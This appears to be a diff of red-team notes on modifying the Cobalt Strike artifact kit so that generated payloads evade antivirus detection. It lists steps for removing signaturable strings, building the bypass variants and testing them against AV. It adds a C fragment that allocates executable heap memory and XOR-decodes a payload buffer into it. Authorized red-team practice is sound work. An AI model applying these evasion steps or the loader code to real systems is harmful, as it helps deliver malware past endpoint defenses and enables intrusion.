@@ -1,14 +1,27 @@
 Download artifact kit from Cobalt help menu
+
 Modify files in src-common and src-main
   - remove all comments and change variables 
   - read through and change anything else that can be signatured
+  - comment out unused dist methods at bottom of build.sh script (compiles faster)
+
 Run ./build.sh
     This will generate the following folders/techniques for AV avoidance
     dist-peek, dist-pipe, dist-readfile, dist-template
     Load one of the cna script into CS and generate a payload to see if AV alerts
 
-Dist-Pipe needs to be modified to use HEAP memory allocation. 
+Modify src-common/patch.c to use HEAP memory allocation. 
 This can be followed using the Cobalt Strike artifact kit Youtube video
+Example
+      void spawn(void * buffer, int length, char * key) {
+              LPVOID heap;
+              heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
+              void * ptr = HeapAlloc(heap, 0, length);
+              int x;
+              for (x = 0; x < length; x++) {
+                      char temp = *((char *)buffer + x) ^ key[x % 4];
+                      *((char *)ptr + x) = temp;
+              }
 
 You can change patch.c but it must be 1024 characters for buffer
 If changing the character in patch.h you must change it in the cna script for each of the bypass dist-* folders
